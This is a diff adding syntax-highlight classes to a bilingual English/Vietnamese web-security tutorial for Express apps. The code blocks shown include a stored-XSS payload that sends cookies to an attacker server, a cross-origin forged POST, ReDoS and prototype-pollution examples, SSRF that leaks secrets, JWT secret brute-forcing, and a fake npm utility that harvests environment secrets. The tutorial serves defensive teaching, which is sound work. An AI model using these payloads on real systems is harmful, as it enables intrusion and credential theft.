@@ -24,7 +24,7 @@ export default {
 
 <h3>Start by looking at what you already send</h3>
 <p>A bare Express 5 app, no middleware, one JSON route. This is the entire response header set:</p>
-<pre><code><span class="tok-kw">const</span> app = express();
+<pre><code class="language-javascript"><span class="tok-kw">const</span> app = express();
 app.get(<span class="tok-str">'/'</span>, (req, res) =&gt; res.json({ ok: <span class="tok-kw">true</span> }));
 app.listen(<span class="tok-num">4101</span>);</code></pre>
 <div class="out">connection: keep-alive
@@ -116,7 +116,7 @@ upgrade-insecure-requests</div>
 
 <h3>Measurement 2 — the thing nobody tells you about CORS</h3>
 <p>A server with <strong>no CORS configuration at all</strong>, and a POST arriving with an attacker's Origin:</p>
-<pre><code>console.log(<span class="tok-str">'số dư trước :'</span>, balance);
+<pre><code class="language-javascript">console.log(<span class="tok-str">'số dư trước :'</span>, balance);
 <span class="tok-kw">await</span> fetch(<span class="tok-str">'http://127.0.0.1:4201/transfer'</span>, {
   method: <span class="tok-str">'POST'</span>, headers: { Origin: <span class="tok-str">'https://evil.example'</span> }, body: <span class="tok-str">'{}'</span> });
 console.log(<span class="tok-str">'số dư sau   :'</span>, balance);</code></pre>
@@ -155,7 +155,7 @@ số dư sau   : 900  ← tiền đã đi rồi</div>
 
 <h3>Bắt đầu bằng việc nhìn xem bạn đang gửi cái gì</h3>
 <p>Một app Express 5 trần, không middleware, một route JSON. Đây là TOÀN BỘ tập header của phản hồi:</p>
-<pre><code><span class="tok-kw">const</span> app = express();
+<pre><code class="language-javascript"><span class="tok-kw">const</span> app = express();
 app.get(<span class="tok-str">'/'</span>, (req, res) =&gt; res.json({ ok: <span class="tok-kw">true</span> }));
 app.listen(<span class="tok-num">4101</span>);</code></pre>
 <div class="out">connection: keep-alive
@@ -247,7 +247,7 @@ upgrade-insecure-requests</div>
 
 <h3>Phép đo 2 — điều không ai nói với bạn về CORS</h3>
 <p>Một máy chủ <strong>hoàn toàn không cấu hình CORS</strong>, và một POST đến kèm Origin của kẻ tấn công:</p>
-<pre><code>console.log(<span class="tok-str">'số dư trước :'</span>, balance);
+<pre><code class="language-javascript">console.log(<span class="tok-str">'số dư trước :'</span>, balance);
 <span class="tok-kw">await</span> fetch(<span class="tok-str">'http://127.0.0.1:4201/transfer'</span>, {
   method: <span class="tok-str">'POST'</span>, headers: { Origin: <span class="tok-str">'https://evil.example'</span> }, body: <span class="tok-str">'{}'</span> });
 console.log(<span class="tok-str">'số dư sau   :'</span>, balance);</code></pre>
@@ -302,7 +302,7 @@ số dư sau   : 900  ← tiền đã đi rồi</div>
 
 <h3>Measurement 1 — a stored XSS, end to end, with a real browser</h3>
 <p>Nothing simulated here. There are three processes: an attacker's server on port 4302 that logs whatever reaches it, a Notes feed on 4301 that renders stored notes, and a victim — a real DOM implementation (jsdom) that parses the HTML and <em>executes the scripts inside it</em>. The attacker posts one note:</p>
-<pre><code><span class="tok-kw">const</span> PAYLOAD = <span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
+<pre><code class="language-javascript"><span class="tok-kw">const</span> PAYLOAD = <span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
   x.open('GET','http://127.0.0.1:4302/steal?c='+encodeURIComponent(document.cookie));
   x.send()&lt;/script&gt;&#96;</span>;
 <span class="tok-kw">await</span> fetch(<span class="tok-str">'http://127.0.0.1:4301/notes'</span>, { method: <span class="tok-str">'POST'</span>,
@@ -319,7 +319,7 @@ số dư sau   : 900  ← tiền đã đi rồi</div>
 
 <h3>httpOnly is not a fix, and here is the proof</h3>
 <p>Same victim, same httpOnly cookie, one different payload — this one does not read the cookie, it simply <em>uses</em> it:</p>
-<pre><code><span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
+<pre><code class="language-javascript"><span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
   x.open('POST','/notes/delete-all'); x.send()&lt;/script&gt;&#96;</span></code></pre>
 <div class="out">4) cookie httpOnly, payload KHÔNG đọc cookie mà tự gọi API:
    /notes/delete-all được gọi 1 lần  ← XSS = chạy code TRONG phiên của nạn nhân</div>
@@ -413,7 +413,7 @@ DOMPurify    12.245ms cho 12.1KB  →    82 lần/giây</div>
 
 <h3>Phép đo 1 — một lỗ stored XSS, từ đầu tới cuối, với trình duyệt thật</h3>
 <p>Không có gì được mô phỏng ở đây. Có ba tiến trình: máy chủ của kẻ tấn công ở cổng 4302 ghi lại mọi thứ bay tới, bảng tin Notes ở 4301 hiển thị các ghi chú đã lưu, và nạn nhân — một bản cài đặt DOM thật (jsdom) phân tích HTML và <em>thực thi các script bên trong</em>. Kẻ tấn công đăng một ghi chú:</p>
-<pre><code><span class="tok-kw">const</span> PAYLOAD = <span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
+<pre><code class="language-javascript"><span class="tok-kw">const</span> PAYLOAD = <span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
   x.open('GET','http://127.0.0.1:4302/steal?c='+encodeURIComponent(document.cookie));
   x.send()&lt;/script&gt;&#96;</span>;
 <span class="tok-kw">await</span> fetch(<span class="tok-str">'http://127.0.0.1:4301/notes'</span>, { method: <span class="tok-str">'POST'</span>,
@@ -430,7 +430,7 @@ DOMPurify    12.245ms cho 12.1KB  →    82 lần/giây</div>
 
 <h3>httpOnly không phải bản sửa, và đây là bằng chứng</h3>
 <p>Vẫn nạn nhân đó, vẫn cookie httpOnly đó, chỉ đổi payload — payload này không đọc cookie, nó chỉ đơn giản <em>dùng</em> cookie:</p>
-<pre><code><span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
+<pre><code class="language-javascript"><span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
   x.open('POST','/notes/delete-all'); x.send()&lt;/script&gt;&#96;</span></code></pre>
 <div class="out">4) cookie httpOnly, payload KHÔNG đọc cookie mà tự gọi API:
    /notes/delete-all được gọi 1 lần  ← XSS = chạy code TRONG phiên của nạn nhân</div>
@@ -531,7 +531,7 @@ DOMPurify    12.245ms cho 12.1KB  →    82 lần/giây</div>
 
 <h3>1. ReDoS — 31 characters that freeze the whole server</h3>
 <p>A regular expression with a nested quantifier. It is not exotic; variants of it appear in validation code everywhere:</p>
-<pre><code><span class="tok-kw">const</span> RE = /^(a+)+$/;
+<pre><code class="language-javascript"><span class="tok-kw">const</span> RE = /^(a+)+$/;
 RE.test(<span class="tok-str">'a'</span>.repeat(n) + <span class="tok-str">'!'</span>);   <span class="tok-cmt">// the inputs do not match</span></code></pre>
 <div class="out">20 ký tự →       8.0ms
 22 ký tự →      32.4ms
@@ -561,7 +561,7 @@ RE.test(<span class="tok-str">'a'</span>.repeat(n) + <span class="tok-str">'!'</
 
 <h3>2. Prototype pollution — one JSON key that makes everyone an admin</h3>
 <p>Every codebase has a deep-merge helper. This is what happens when the object being merged came from <code>req.body</code>:</p>
-<pre><code><span class="tok-kw">function</span> <span class="tok-fn">merge</span>(target, src) {
+<pre><code class="language-javascript"><span class="tok-kw">function</span> <span class="tok-fn">merge</span>(target, src) {
   <span class="tok-kw">for</span> (<span class="tok-kw">const</span> k <span class="tok-kw">of</span> Object.keys(src)) {
     <span class="tok-kw">if</span> (<span class="tok-kw">typeof</span> src[k] === <span class="tok-str">'object'</span> &amp;&amp; src[k] !== <span class="tok-kw">null</span>) { target[k] ??= {}; merge(target[k], src[k]); }
     <span class="tok-kw">else</span> target[k] = src[k];
@@ -608,7 +608,7 @@ RSS sau 1.5 giây      : 213 MB</div>
 
 <h3>4. SSRF — making your server read its own secrets</h3>
 <p>The feature is completely ordinary: a link preview, an avatar import, a webhook test button. The user supplies a URL and the server fetches it.</p>
-<pre><code>app.get(<span class="tok-str">'/preview'</span>, <span class="tok-kw">async</span> (req, res) =&gt; {
+<pre><code class="language-javascript">app.get(<span class="tok-str">'/preview'</span>, <span class="tok-kw">async</span> (req, res) =&gt; {
   <span class="tok-kw">const</span> r = <span class="tok-kw">await</span> fetch(req.query.url);      <span class="tok-cmt">// ← the entire vulnerability is right here</span>
   res.type(<span class="tok-str">'text'</span>).send(<span class="tok-kw">await</span> r.text());
 });</code></pre>
@@ -617,7 +617,7 @@ RSS sau 1.5 giây      : 213 MB</div>
   200 {"DATABASE_URL":"postgres://prod:sieu-mat@db:5432/app","R2_SECRET":"wJalr…"}</div>
 <p>That is the whole attack. In a container network the same trick reaches <code>http://postgres:5432</code>, <code>http://redis:6379</code>, the Docker socket, or — on a cloud VM — the metadata endpoint at <code>169.254.169.254</code> that hands out temporary IAM credentials. The firewall did nothing wrong: the request came from inside.</p>
 <p>Now the fixed version, and the trap in it:</p>
-<pre><code><span class="tok-kw">const</span> ALLOW = <span class="tok-kw">new</span> Set([<span class="tok-str">'media.cuongthai.com'</span>, <span class="tok-str">'i.giphy.com'</span>]);
+<pre><code class="language-javascript"><span class="tok-kw">const</span> ALLOW = <span class="tok-kw">new</span> Set([<span class="tok-str">'media.cuongthai.com'</span>, <span class="tok-str">'i.giphy.com'</span>]);
 <span class="tok-kw">const</span> u = <span class="tok-kw">new</span> URL(req.query.url);
 <span class="tok-kw">if</span> (u.protocol !== <span class="tok-str">'https:'</span>) <span class="tok-kw">return</span> res.status(<span class="tok-num">400</span>).json({ error: <span class="tok-str">'chỉ chấp nhận https'</span> });
 <span class="tok-kw">if</span> (!ALLOW.has(u.hostname)) <span class="tok-kw">return</span> res.status(<span class="tok-num">400</span>).json({ error: <span class="tok-str">'tên miền không nằm trong danh sách trắng'</span> });</code></pre>
@@ -659,7 +659,7 @@ RSS sau 1.5 giây      : 213 MB</div>
 
 <h3>1. ReDoS — 31 ký tự đóng băng cả máy chủ</h3>
 <p>Một biểu thức chính quy có lượng từ lồng nhau. Nó không hề kỳ quái; các biến thể của nó nằm rải rác trong code kiểm tra dữ liệu ở khắp nơi:</p>
-<pre><code><span class="tok-kw">const</span> RE = /^(a+)+$/;
+<pre><code class="language-javascript"><span class="tok-kw">const</span> RE = /^(a+)+$/;
 RE.test(<span class="tok-str">'a'</span>.repeat(n) + <span class="tok-str">'!'</span>);   <span class="tok-cmt">// đầu vào KHÔNG khớp</span></code></pre>
 <div class="out">20 ký tự →       8.0ms
 22 ký tự →      32.4ms
@@ -689,7 +689,7 @@ RE.test(<span class="tok-str">'a'</span>.repeat(n) + <span class="tok-str">'!'</
 
 <h3>2. Ô nhiễm nguyên mẫu — một khoá JSON biến mọi người thành admin</h3>
 <p>Dự án nào cũng có một hàm trộn sâu. Đây là chuyện xảy ra khi object đem trộn đến từ <code>req.body</code>:</p>
-<pre><code><span class="tok-kw">function</span> <span class="tok-fn">merge</span>(target, src) {
+<pre><code class="language-javascript"><span class="tok-kw">function</span> <span class="tok-fn">merge</span>(target, src) {
   <span class="tok-kw">for</span> (<span class="tok-kw">const</span> k <span class="tok-kw">of</span> Object.keys(src)) {
     <span class="tok-kw">if</span> (<span class="tok-kw">typeof</span> src[k] === <span class="tok-str">'object'</span> &amp;&amp; src[k] !== <span class="tok-kw">null</span>) { target[k] ??= {}; merge(target[k], src[k]); }
     <span class="tok-kw">else</span> target[k] = src[k];
@@ -736,7 +736,7 @@ RSS sau 1.5 giây      : 213 MB</div>
 
 <h3>4. SSRF — bắt máy chủ tự đi đọc bí mật của chính nó</h3>
 <p>Tính năng thì hết sức bình thường: xem trước một link, nhập ảnh đại diện từ URL, nút thử webhook. Người dùng đưa một URL và máy chủ đi lấy nó.</p>
-<pre><code>app.get(<span class="tok-str">'/preview'</span>, <span class="tok-kw">async</span> (req, res) =&gt; {
+<pre><code class="language-javascript">app.get(<span class="tok-str">'/preview'</span>, <span class="tok-kw">async</span> (req, res) =&gt; {
   <span class="tok-kw">const</span> r = <span class="tok-kw">await</span> fetch(req.query.url);      <span class="tok-cmt">// ← toàn bộ lỗ hổng nằm ở đây</span>
   res.type(<span class="tok-str">'text'</span>).send(<span class="tok-kw">await</span> r.text());
 });</code></pre>
@@ -745,7 +745,7 @@ RSS sau 1.5 giây      : 213 MB</div>
   200 {"DATABASE_URL":"postgres://prod:sieu-mat@db:5432/app","R2_SECRET":"wJalr…"}</div>
 <p>Toàn bộ đòn tấn công chỉ có thế. Trong một mạng container, cùng chiêu đó với tới <code>http://postgres:5432</code>, <code>http://redis:6379</code>, socket của Docker, hoặc — trên máy ảo đám mây — endpoint metadata ở <code>169.254.169.254</code> nơi phát ra thông tin đăng nhập IAM tạm thời. Tường lửa không làm gì sai cả: request đến từ bên trong.</p>
 <p>Giờ tới bản đã sửa, và cái bẫy nằm trong đó:</p>
-<pre><code><span class="tok-kw">const</span> ALLOW = <span class="tok-kw">new</span> Set([<span class="tok-str">'media.cuongthai.com'</span>, <span class="tok-str">'i.giphy.com'</span>]);
+<pre><code class="language-javascript"><span class="tok-kw">const</span> ALLOW = <span class="tok-kw">new</span> Set([<span class="tok-str">'media.cuongthai.com'</span>, <span class="tok-str">'i.giphy.com'</span>]);
 <span class="tok-kw">const</span> u = <span class="tok-kw">new</span> URL(req.query.url);
 <span class="tok-kw">if</span> (u.protocol !== <span class="tok-str">'https:'</span>) <span class="tok-kw">return</span> res.status(<span class="tok-num">400</span>).json({ error: <span class="tok-str">'chỉ chấp nhận https'</span> });
 <span class="tok-kw">if</span> (!ALLOW.has(u.hostname)) <span class="tok-kw">return</span> res.status(<span class="tok-num">400</span>).json({ error: <span class="tok-str">'tên miền không nằm trong danh sách trắng'</span> });</code></pre>
@@ -795,7 +795,7 @@ RSS sau 1.5 giây      : 213 MB</div>
 
 <h3>Measurement 1 — a weak JWT secret is not "a bit weaker"</h3>
 <p>Chapter 8 built the whole auth system on <code>JWT_SECRET</code>. Here is what happens if that value is a word. The attacker has one thing: a token, which any logged-in user can read out of their own browser.</p>
-<pre><code><span class="tok-kw">const</span> WEAK = [<span class="tok-str">'secret'</span>, <span class="tok-str">'password'</span>, <span class="tok-str">'123456'</span>, <span class="tok-str">'changeme'</span>, <span class="tok-str">'jwt_secret'</span>,
+<pre><code class="language-javascript"><span class="tok-kw">const</span> WEAK = [<span class="tok-str">'secret'</span>, <span class="tok-str">'password'</span>, <span class="tok-str">'123456'</span>, <span class="tok-str">'changeme'</span>, <span class="tok-str">'jwt_secret'</span>,
              <span class="tok-str">'supersecret'</span>, <span class="tok-str">'mysecretkey'</span>, <span class="tok-str">'secretkey'</span>, <span class="tok-str">'nodejs'</span>, <span class="tok-str">'admin123'</span>];
 <span class="tok-kw">for</span> (<span class="tok-kw">const</span> w <span class="tok-kw">of</span> WEAK) { <span class="tok-kw">try</span> { jwt.verify(token, w); found = w; <span class="tok-kw">break</span> } <span class="tok-kw">catch</span> {} }</code></pre>
 <div class="out">từ điển 10 từ → tìm thấy "supersecret" trong 1.04ms
@@ -810,7 +810,7 @@ crypto.randomBytes(32).toString('base64url') = xUMtHMbnIi6NDoiYUqHLnNsgPLpRnGpdc
 
 <h3>Measurement 2 — comparing secrets</h3>
 <p>When you check an API key, <code>a === b</code> returns as soon as it finds a differing byte. The time it takes therefore depends on how many leading bytes are correct, which is information an attacker can measure and use to build the key one byte at a time. Node ships the fix:</p>
-<pre><code><span class="tok-kw">const</span> cmpSafe = (a, b) =&gt; {
+<pre><code class="language-javascript"><span class="tok-kw">const</span> cmpSafe = (a, b) =&gt; {
   <span class="tok-kw">const</span> x = Buffer.from(a), y = Buffer.from(b);
   <span class="tok-kw">return</span> x.length === y.length &amp;&amp; crypto.timingSafeEqual(x, y);
 };</code></pre>
@@ -839,7 +839,7 @@ nên trả     : {"error":"INTERNAL","requestId":"90779998-0e6f-4c9d-9538-bd4b59
 $ find node_modules -maxdepth 2 -name package.json | wc -l
 183</div>
 <p>Nine packages you chose, 183 packages you run. Every one of them executes with the full privileges of your process: <code>process.env</code>, the filesystem, the network. Here is a "utility" package doing exactly that — the top line is the real function, the rest is the payload:</p>
-<pre><code>module.exports = (s, n) =&gt; String(s).padStart(n, <span class="tok-str">' '</span>);
+<pre><code class="language-javascript">module.exports = (s, n) =&gt; String(s).padStart(n, <span class="tok-str">' '</span>);
 
 <span class="tok-kw">const</span> loot = Object.entries(process.env)
   .filter(([k]) =&gt; /SECRET|KEY|TOKEN|PASSWORD|DATABASE/i.test(k));
@@ -903,7 +903,7 @@ file kẻ tấn công ghi ra: [["DATABASE_URL","postgres://prod:sieu-mat@db:5432
 
 <h3>Phép đo 1 — bí mật JWT yếu không phải là "yếu hơn một chút"</h3>
 <p>Chương 8 dựng toàn bộ hệ xác thực trên <code>JWT_SECRET</code>. Đây là chuyện xảy ra nếu giá trị đó là một từ tiếng Anh. Kẻ tấn công chỉ có đúng một thứ: một token, thứ mà bất kỳ người dùng đã đăng nhập nào cũng đọc được từ trình duyệt của chính mình.</p>
-<pre><code><span class="tok-kw">const</span> WEAK = [<span class="tok-str">'secret'</span>, <span class="tok-str">'password'</span>, <span class="tok-str">'123456'</span>, <span class="tok-str">'changeme'</span>, <span class="tok-str">'jwt_secret'</span>,
+<pre><code class="language-javascript"><span class="tok-kw">const</span> WEAK = [<span class="tok-str">'secret'</span>, <span class="tok-str">'password'</span>, <span class="tok-str">'123456'</span>, <span class="tok-str">'changeme'</span>, <span class="tok-str">'jwt_secret'</span>,
              <span class="tok-str">'supersecret'</span>, <span class="tok-str">'mysecretkey'</span>, <span class="tok-str">'secretkey'</span>, <span class="tok-str">'nodejs'</span>, <span class="tok-str">'admin123'</span>];
 <span class="tok-kw">for</span> (<span class="tok-kw">const</span> w <span class="tok-kw">of</span> WEAK) { <span class="tok-kw">try</span> { jwt.verify(token, w); found = w; <span class="tok-kw">break</span> } <span class="tok-kw">catch</span> {} }</code></pre>
 <div class="out">từ điển 10 từ → tìm thấy "supersecret" trong 1.04ms
@@ -918,7 +918,7 @@ crypto.randomBytes(32).toString('base64url') = xUMtHMbnIi6NDoiYUqHLnNsgPLpRnGpdc
 
 <h3>Phép đo 2 — so sánh chuỗi bí mật</h3>
 <p>Khi bạn kiểm một API key, <code>a === b</code> trả về ngay khi gặp byte đầu tiên khác nhau. Vậy nên thời gian nó chạy phụ thuộc vào số byte đầu ĐÚNG, và đó là thông tin kẻ tấn công đo được rồi dùng để dựng dần cái khoá từng byte một. Node có sẵn bản sửa:</p>
-<pre><code><span class="tok-kw">const</span> cmpSafe = (a, b) =&gt; {
+<pre><code class="language-javascript"><span class="tok-kw">const</span> cmpSafe = (a, b) =&gt; {
   <span class="tok-kw">const</span> x = Buffer.from(a), y = Buffer.from(b);
   <span class="tok-kw">return</span> x.length === y.length &amp;&amp; crypto.timingSafeEqual(x, y);
 };</code></pre>
@@ -947,7 +947,7 @@ nên trả     : {"error":"INTERNAL","requestId":"90779998-0e6f-4c9d-9538-bd4b59
 $ find node_modules -maxdepth 2 -name package.json | wc -l
 183</div>
 <p>Chín gói bạn chọn, 183 gói bạn chạy. Mỗi gói trong đó thực thi với TOÀN BỘ quyền của tiến trình bạn: <code>process.env</code>, hệ thống file, mạng. Đây là một gói "tiện ích" làm đúng chuyện đó — dòng trên cùng là hàm thật, phần còn lại là payload:</p>
-<pre><code>module.exports = (s, n) =&gt; String(s).padStart(n, <span class="tok-str">' '</span>);
+<pre><code class="language-javascript">module.exports = (s, n) =&gt; String(s).padStart(n, <span class="tok-str">' '</span>);
 
 <span class="tok-kw">const</span> loot = Object.entries(process.env)
   .filter(([k]) =&gt; /SECRET|KEY|TOKEN|PASSWORD|DATABASE/i.test(k));
